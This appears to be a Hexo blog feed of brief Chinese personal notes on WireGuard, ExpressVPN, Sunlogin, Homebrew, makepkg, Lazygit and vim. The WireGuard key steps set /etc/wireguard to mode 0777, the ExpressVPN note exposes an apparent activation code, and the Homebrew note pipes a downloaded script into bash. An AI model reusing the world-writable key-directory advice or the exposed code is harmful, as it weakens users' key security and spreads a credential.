class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/etc/</span>wireguard/wg0.conf<br><br>[<span class="hljs-keyword">Interface</span>]<br>PrivateKey = [CLIENT <span class="hljs-keyword">PRIVATE</span> KEY]<br>MTU = <span class="hljs-number">1420</span><br><br>[Peer]<br>PublicKey = [SERVER PUBLICKEY]<br>AllowedIPs = <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span><span class="hljs-regexp">/24, 10.123.45.0/</span><span class="hljs-number">24</span>, <span class="hljs-number">1234</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">89</span>ab::/<span class="hljs-number">48</span><br>Endpoint = [SERVER ENDPOINT]:<span class="hljs-number">5182</span><br>PersistentKeepalive = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h2 id="配置一个-VPN-服务器"><a href="#配置一个-VPN-服务器" class="headerlink" title="配置一个 VPN 服务器"></a>配置一个 VPN 服务器</h2><p>WireGuard 自带一个快速创建和销毁 VPN 服务器的工具 – <code>wg-quick</code>.</p><p>具体配置见 <a href="https://wiki.archlinux.org/title/WireGuard">ArchWiki</a>.</p><p>需要配置服务器端和客户端.</p><p>客户端的 IP 需要和 <code>wg0server.conf</code> 中的子网掩吗相同.</p><p>使用 <code>wg-quick up wg0</code> 来启用 Interface, 使用 <code>wg-quick down wg0</code> 来关闭.</p><p>使用 <code>systemctl enable wg-quick@wg0</code> 来自动启动.</p><p>如果使用 NetworkManager, 可能有必要启用 NetworkManager-wait-online.service.</p><h2 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo netstat -ntpl</span><br></code></pre></td></tr></table></figure><h1 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a><a href="https://www.bilibili.com/video/BV1uT411w7Tq?share_source=copy_web&vd_source=07f553d0f02b7055cfbb295adfde9f48">参考 B 站</a></h1><p>VPN, Virtual Private Network 的作用是保证访问的私密. 对数据进行加密, 校验.<br><img src="/../img/for_wireguard.png" alt="示意图"></p><p>wireguard 是一种 VPN 技术. 其可以让连接的设备以为自己处于同一个内网中. 从上面的示意图可以看出, 这个虚拟的内网是由 wireguard 链路连接的.</p><p>wireguard 并不区分客户端和服务器端.</p><p>在任何设备上如果安装了 wireguard 都会被视为一个节点. 其既可以连接其他设备也可已被其他设备直接连接.</p><p>也就是说, 用一台拥有公网 IP 的服务器作为连接点, 使得所有连接到这台服务器的主机都可以通信.</p><h1 id="Ubuntu-上的手动操作-具体看文档-已拉取到本地"><a href="#Ubuntu-上的手动操作-具体看文档-已拉取到本地" class="headerlink" title="Ubuntu 上的手动操作 (具体看文档, 已拉取到本地)"></a>Ubuntu 上的手动操作 (具体看文档, 已拉取到本地)</h1><p>安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install wireguard resolvconf<br></code></pre></td></tr></table></figure><p>开启 ipv4 转发, 使该服务器能够成为一个转发的服务器:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br></code></pre></td></tr></table></figure><p>可以通过 <code>sysctl -p</code> 查看是否设置成功.</p><p>wireguard 的配置文件位于 <code>/etc/wireguard</code></p><h2 id="生成服务器上的密钥对"><a href="#生成服务器上的密钥对" class="headerlink" title="生成服务器上的密钥对"></a>生成服务器上的密钥对</h2><p>每一个节点需要生成一对密钥.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> /etc/wireguard<br>$ <span class="hljs-built_in">chmod</span> 0777 /etc/wireguard<br>$ <span class="hljs-built_in">umask</span> 0777<br>$ wg genkey &gt; server.key<br>$ wg pubkey &lt; server.key &gt; server.key.pub<br></code></pre></td></tr></table></figure><p>最后一行是根据私钥来创建公钥.</p><h2 id="生成客户端的密钥对"><a href="#生成客户端的密钥对" class="headerlink" title="生成客户端的密钥对"></a>生成客户端的密钥对</h2><p>是在服务器上生成.</p><p>和上面同样的操作.</p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p><code>[Interface]</code> 配置的是虚拟网卡的信息.</p><p>监听端口用来判断 client 的连接.</p><p>每添加一个 peer 都要在 server 的配置文件中添加 <code>[Peer]</code> 块.</p><p>客户端的配置和服务器端的配置类似.</p><p>重新设置了配置文件, 需要重启 wireguard, 利用 down 和 up.</p><p>客户端的 IP 需要在 服务器端设置 (这里的 IP 是虚拟 IP).</p><p>Endpoint 是设置对端也就是服务器的 IP 和端口. 其实是我们被其他节点主动连接的时候所使用的 IP. 设置 server 是因为 server 是被主动连接的.</p><p>wireguard 使用的是 UDP 协议.</p><p>连接之后两台主机就可以通话了.</p><p>可以用 <code>wg</code> 命令来查看 wireguard 的连接状况.</p><p><img src="/../img/another_rela_of_wireguard.png"></p><p>keepalive 是尝试重连.</p><p>搭建了内网穿透就可以直接连接远端没有公网 IP 的服务器.</p><h1 id="利用-Docker-搭建"><a href="#利用-Docker-搭建" class="headerlink" title="利用 Docker 搭建"></a>利用 Docker 搭建</h1><p><a href="https://github.com/WeeJeWel/wg-easy">github 相关页面</a><br>其生成的配置文件是 client 的.</p><p>在有公网的服务器创建一个 Docker, 然后用这个 Docker 访问控制页面.</p><h2 id="手机连入"><a href="#手机连入" class="headerlink" title="手机连入"></a>手机连入</h2><p>可以用手机客户端扫二维码.</p><h1 id="自己尝试"><a href="#自己尝试" class="headerlink" title="自己尝试"></a>自己尝试</h1><h2 id="手动配置"><a href="#手动配置" class="headerlink" title="手动配置"></a>手动配置</h2><p>按照上面 司波图 的博客内容可以成功搭建.</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>出了些小问题.</p><p>结果是我服务器的端口开放错误, 开放了另一个端口.</p><p>按照教程即可完成.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-sunloginclient-远程连接</title>
    <link href="/2022/09/17/%E4%BD%BF%E7%94%A8-sunloginclient-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
    <url>/2022/09/17/%E4%BD%BF%E7%94%A8-sunloginclient-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>使用 yay 下载或者上 aur 搜索:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S sunloginclient</span><br></code></pre></td></tr></table></figure><p>用:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sunloginclientj<br></code></pre></td></tr></table></figure><p>启动软件.</p><p>通过输入识别码和状态码来连接.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查询本机-ip-以及网络供应商</title>
    <link href="/2022/09/17/%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA-ip-%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E4%BE%9B%E5%BA%94%E5%95%86/"/>
    <url>/2022/09/17/%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA-ip-%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E4%BE%9B%E5%BA%94%E5%95%86/</url>
    
    <content type="html"><![CDATA[<p>在百度上搜索 ip, 就会显示本机 ip 和网络供应商.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-ExpressVPN-搭建</title>
    <link href="/2022/09/16/%E5%85%B3%E4%BA%8E-ExpressVPN-%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/16/%E5%85%B3%E4%BA%8E-ExpressVPN-%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="选择-VPN-Server-Location"><a href="#选择-VPN-Server-Location" class="headerlink" title="选择 VPN Server Location"></a>选择 VPN Server Location</h1><p><a href="https://www.expressvpn.com/vpn-server">列表</a><br>貌似可以用一下命令连接:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">expressvpn connect smart<br></code></pre></td></tr></table></figure><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://www.expressvpn.com/setup#linux">官网下载</a><br>下载了软件包之后:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pacman -U<span class="hljs-meta"> [installer filename]</span><br></code></pre></td></tr></table></figure><p>里面的 Setup 一栏下的 activation code (激活码):</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">E2A2DQCUVGGXQB4FSOSPFKT</span>  <br></code></pre></td></tr></table></figure><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p>输入:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ expressvpn <span class="hljs-built_in">activate</span><br></code></pre></td></tr></table></figure><p>然后输入 activation code.</p><p>可能会询问你是否进行 anonymized diagnostic reports (匿名诊断).</p><p>如果想关掉:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> send_diagnostics <span class="hljs-comment">false</span><br></code></pre></td></tr></table></figure><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn connect<br></code></pre></td></tr></table></figure><p>如果是首次连接, ExpressVPN 会启用 Smart Location.</p><p>如果不是第一次连接, ExpressVPN 会连接到最常用的 location.</p><p>一条 ExpressVPN subscription 可以用于 5 个设备.</p><h1 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn disconnect<br></code></pre></td></tr></table></figure><h1 id="连接不同的-VPN-server-location"><a href="#连接不同的-VPN-server-location" class="headerlink" title="连接不同的 VPN server location"></a>连接不同的 VPN server location</h1><p>先查看有哪些:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn list<br></code></pre></td></tr></table></figure><p>这里, Smart Location 会显示在列表最顶上.</p><p>查看所有的 avaliable locations:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn list <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h1 id="连接一个特定的-location"><a href="#连接一个特定的-location" class="headerlink" title="连接一个特定的 location"></a>连接一个特定的 location</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ expressvpn <span class="hljs-keyword">connect</span> [<span class="hljs-keyword">LOCATION</span>]<br></code></pre></td></tr></table></figure><p>或者:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn connect [<span class="hljs-keyword">ALIAS</span>]<br></code></pre></td></tr></table></figure><h1 id="连接-Smart-Location"><a href="#连接-Smart-Location" class="headerlink" title="连接 Smart Location"></a>连接 Smart Location</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn connect smart<br></code></pre></td></tr></table></figure><h1 id="切换到不同的-VPN-protocol"><a href="#切换到不同的-VPN-protocol" class="headerlink" title="切换到不同的 VPN protocol"></a>切换到不同的 VPN protocol</h1><p>需要先断开 vpn 的连接:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn disconnect <br></code></pre></td></tr></table></figure><p>ExpressVPN 会推荐使用 <code>Automatic</code> protocol option. 这会选择最合适的 protocol.</p><p>切换到 Lightway-TCP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol lightway_tcp<br></code></pre></td></tr></table></figure><p>切换到 Lightway-UDP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol lightway_udp<br></code></pre></td></tr></table></figure><p>切换到 OpenVPN-TCP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol tcp<br></code></pre></td></tr></table></figure><p>切换到 OpenVPN-UDP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol udp<br></code></pre></td></tr></table></figure><p>启动 Automatic 模式:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn protocol <span class="hljs-built_in">auto</span><br></code></pre></td></tr></table></figure><h1 id="阻挡-trackers-and-malicious-sites"><a href="#阻挡-trackers-and-malicious-sites" class="headerlink" title="阻挡 trackers and malicious sites"></a>阻挡 trackers and malicious sites</h1><p>先确保连接到 VPN 以及使用的是 Automatic 或 Lightway protocol</p><p>启用 Threat Manager:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> block_trackers <span class="hljs-comment">true</span><br></code></pre></td></tr></table></figure><p>关闭:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> block_trackers <span class="hljs-comment">off</span><br></code></pre></td></tr></table></figure><p><a href="https://www.expressvpn.com/features/threat-manager">更多相关信息</a></p><h1 id="打开-app-manual"><a href="#打开-app-manual" class="headerlink" title="打开 app manual"></a>打开 app manual</h1><p>查看可用选项:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">man expressvpn</span><br></code></pre></td></tr></table></figure><h1 id="自动连接"><a href="#自动连接" class="headerlink" title="自动连接"></a>自动连接</h1><p>会自动连接上次选择的 location:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn <span class="hljs-built_in">auto</span>connection <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>关闭:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn <span class="hljs-built_in">auto</span>connection <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h1 id="使用浏览器扩展"><a href="#使用浏览器扩展" class="headerlink" title="使用浏览器扩展"></a>使用浏览器扩展</h1><p>获得扩展:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> expressvpn <span class="hljs-built_in">install-firefox</span><span class="hljs-literal">-extension</span><br><span class="hljs-variable">$</span> expressvpn <span class="hljs-built_in">install-chrome</span><span class="hljs-literal">-extension</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>VPN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vimium-的使用</title>
    <link href="/2022/09/16/Vimium-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/Vimium-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决在-shell-脚本中-cd-命令不起作用问题</title>
    <link href="/2022/09/16/%E8%A7%A3%E5%86%B3%E5%9C%A8-shell-%E8%84%9A%E6%9C%AC%E4%B8%AD-cd-%E5%91%BD%E4%BB%A4%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/16/%E8%A7%A3%E5%86%B3%E5%9C%A8-shell-%E8%84%9A%E6%9C%AC%E4%B8%AD-cd-%E5%91%BD%E4%BB%A4%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>通常我们直接执行 shell 脚本文件, 它会打开一个子 shell 并由其执行, 因此, 我们的 cd 命令实际上是在子 shell 中执行了, 所以当前 shell 中并未跳转.</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>使用 <code>source</code> 命令, 它会读取脚本文件并在当前 shell 里面执行, 并没有创建新的 shell.</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-中关于-makepkg-部分</title>
    <link href="/2022/09/16/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-makepkg-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/16/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-makepkg-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>系统配置文件在 <code>/etc/makepkg.conf</code>.</p><p>用户的位于 <code>$XDG_CONFIG_HOME/pacman/makepkg.conf</code> 或 <code>~/.makepkg.conf</code>.</p><h2 id="Packager-information"><a href="#Packager-information" class="headerlink" title="Packager information"></a>Packager information</h2><p>关于包的制作者的信息:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">$ pacman -Qi <span class="hljs-keyword">package</span><br></code></pre></td></tr></table></figure><h2 id="Package-output"><a href="#Package-output" class="headerlink" title="Package output"></a>Package output</h2><p>makepkg 这个命令会将源代码直接下在到当前工作目录下的 <code>src/</code> 目录下, 没有 <code>src/</code> 目录应该会自动创建. 也可以自定义路径.</p><p>修改 makepkg.conf 中的环境变量:</p><ul><li>PKGDEST</li><li>RCDEST</li><li>SRCPKGDEST<br>具体看 wiki.</li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><code>-s/--syncdeps</code> 选项, 会 build the package 而且会安装相关依赖.</p><p><code>-r/--rmdeps</code> 选项, 会在安装结束后移除不再需要的相关依赖.</p><p>在 build successfully 和满足所有依赖之后, 会在当前目录生成一个 <code>pkgname-pkgver.pkg.tar.zst</code> 的文件包, 这个时候用 <code>-i/--install</code> 选项来安装.</p><p>添加 <code>-c/--clean</code> 选项可以清除剩下的文件和目录.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>.config 目录的使用</title>
    <link href="/2022/09/16/config-%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/config-%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>brew 包管理器</title>
    <link href="/2022/09/16/brew-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    <url>/2022/09/16/brew-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://brew.sh/">官网</a><br>官方的下载命令为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh))&quot;</span> <br></code></pre></td></tr></table></figure><p>但是可能 <code>curl</code> 会报错, 所以可以直接打开 <code>https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh</code> 这个网站, 然后复制脚本之后, 再安装.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lazygit 安装和使用</title>
    <link href="/2022/09/16/Lazygit-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/Lazygit-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/RTLmaG5">参考</a></p><h1 id="官方教程"><a href="#官方教程" class="headerlink" title="官方教程"></a>官方教程</h1><h2 id="Undo-x2F-Redo-特性"><a href="#Undo-x2F-Redo-特性" class="headerlink" title="Undo&#x2F;Redo 特性"></a>Undo&#x2F;Redo 特性</h2><p>默认的 ‘z’ 是 undo, <code>&lt;C-z&gt;</code> 是 redo.</p><p>lazygit 利用 reflog 来跟踪. 因此 lazygit 只能 undo reflog 中的操作.</p><p>创建的新的 branch 不会被 undo.</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Linux 下的默认配置文件路径为: <code>~/.config/lazygit/config.yml</code></p><p>默认的配置在官网上可以看到, 可以复制到你的 <code>config.yml</code> 文件中.</p><p>editor 我设置的是 <code>$VISUAL</code>.</p><p>具体的颜色配置可以参考官网.</p><p>可以自定义命令, 在 <code>customCommands:</code> 之后.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>还是 vim 按键.</p><p>按 [] 可在每一个面板里的 tag 之间跳转.</p><p>按 x 可以看到 menu 界面, 用于查找快捷键.</p><h2 id="files-面板"><a href="#files-面板" class="headerlink" title="files 面板"></a>files 面板</h2><p>a (add): 把文件 stage, 即 add 到 stage. 再按一下 a 可以 unstage 文件. 这个是全部一起 stage.</p><p><space> : 一个一个 stage, 如果按下回车, 甚至可以只提交文件的一部分.</p><p>在 files 面板按 c (commit) 可以提交. 按 C 可以在编辑器中编辑修改. 按 A 可以将本次要提交的内容 amend 到上次的 commit. 按 d (delete) 可以删除文件. 按下 D 可以看到更多放弃更改的选项, 第一个 <code>reset --hard HEAD &amp;&amp; git clean -fd</code> 可以删除所有更改.</p><p>按 s 可以隐藏文件的更改到 stash 面板.</p><p>按 g 可以 pop 一次 stash.</p><h2 id="staged-x2F-unstaged-面板"><a href="#staged-x2F-unstaged-面板" class="headerlink" title="staged&#x2F;unstaged 面板"></a>staged&#x2F;unstaged 面板</h2><p>tab : 在 staged&#x2F;unstaged 面板之间跳转.</p><p>在 staged 面板按 d, 可以 unstage 文件. </p><p>在 unstaged 面板中按 a 可以全部选中, 再按 <space> 可以将其移动到 staged 面板.</p><h2 id="分支面板"><a href="#分支面板" class="headerlink" title="分支面板"></a>分支面板</h2><p>按 n (new) 可以添加分支.</p><p>用 <space> 可以选中分支.</p><p>按 P (push) 就会发布到远端.</p><p>合并分支, 先切换到接受合并的分支, 再选中想要合并的分支, 按 M 就可以 merge.</p><p>想要会滚就在这里, 先选中一个 branch, 然后可以看到这个 branch 的 commit 历史, 选中一个 commit 就可以会滚.</p><p>未命名的被 checkout 的 commit 不会保存在分支界面.</p><p>当前所处的分支不能被删除.</p><h2 id="commit-面板"><a href="#commit-面板" class="headerlink" title="commit 面板"></a>commit 面板</h2><p>, 和 . 可以在列表中翻页, &lt; 和 &gt; 可以回到列表的最上方和最下方.</p><p>&#x2F; 用于搜索.</p><p>按 r (reword commit) 更改提交信息.</p><p><space> 回滚, 相当于 checkout, 但并不会会到那个状态, 在此基础上到分支面板按下 n 可以新建这个分支.</p><p>按 g, 可以 reset 分支. soft reset 不会删除文件.</p><p>所有删除其实 redo, 在 Reflog 这个 tag 里面可以看到更改的历史记录.</p><h2 id="stash-面板"><a href="#stash-面板" class="headerlink" title="stash 面板"></a>stash 面板</h2><p>被 stash 的 commit 不会出现在分支的节点上.</p><p>按 g 可以 pop 一次 stash.</p><p>按 d 同样可以删除.</p><p>redo 在 stash 界面无效, 因为 stash 不会被记录在 reflog 中.</p><h2 id="indirect-rebasing"><a href="#indirect-rebasing" class="headerlink" title="indirect rebasing"></a>indirect rebasing</h2><p>也就是重写 git 的提交历史. 可以把一次提交里面的更改和并到另一次提交里面.</p><p><C-p> 和 patch 相关. </p><p>将两次提交合并为一次, 选中一个 commit, 按下 s (squash) 就会把它和下面的一个 commit 合并在一起. </p><p>可以批量操作.</p><h2 id="fixup"><a href="#fixup" class="headerlink" title="fixup"></a>fixup</h2><p>按 f, 也可以将两次提交合并.</p><h2 id="解决合并冲突"><a href="#解决合并冲突" class="headerlink" title="解决合并冲突"></a>解决合并冲突</h2><p>在 Merge Conflict 面板里按上下键可以选择更改, <space> 选中代码段.</p><p>按 b 可以保留冲突的两种更改.</p><h2 id="查看指定文本的提交"><a href="#查看指定文本的提交" class="headerlink" title="查看指定文本的提交"></a>查看指定文本的提交</h2><C-f>## 查看 diffM## 快速打开 lazygit### ranger修改 rc.conf 文件. 添加一个 map.### vim添加一个 map.# 配置在 lazygit 仓库的 docs 目录下, 查看 config.md 文件.]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决 vim 粘贴时格式错误</title>
    <link href="/2022/09/16/%E8%A7%A3%E5%86%B3-vim-%E7%B2%98%E8%B4%B4%E6%97%B6%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/"/>
    <url>/2022/09/16/%E8%A7%A3%E5%86%B3-vim-%E7%B2%98%E8%B4%B4%E6%97%B6%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="t.zoukankan.com/faithH-p-12145181.html">参考</a><br>进入 paste 模式进行粘贴, 但进入 paste 模式后别用 i 进入插入模式, 直接粘贴即可.</p><p>设置 mapping:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;leader&gt;</span><span class="hljs-keyword">p</span> :<span class="hljs-keyword">set</span> paste<br><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;leader&gt;</span><span class="hljs-keyword">P</span> :<span class="hljs-keyword">set</span> nopaste<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>unity 5.x 从入门到精通 Notes</title>
    <link href="/2022/09/15/unity-5-x-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-Notes/"/>
    <url>/2022/09/15/unity-5-x-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://unity3d.com/learn">交流平台</a></p>]]></content>
    
    
    <categories>
      
      <category>Unity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Unity 3D 游戏开发 Notes</title>
    <link href="/2022/09/15/Unity-3D-%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91-Notes/"/>
    <url>/2022/09/15/Unity-3D-%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h1><h2 id="1-3-Unity-版本"><a href="#1-3-Unity-版本" class="headerlink" title="1.3 Unity 版本"></a>1.3 Unity 版本</h2><p>Unity 提供了新工具 Unity Hub 来专门管理多版本. <a href="https://blogs.unity3d.com/cn/2018/01/24/streamline-your-workflow-introducing-unity-hub-beta/">介绍</a></p>]]></content>
    
    
    <categories>
      
      <category>Unity</category>
      
    </categories>
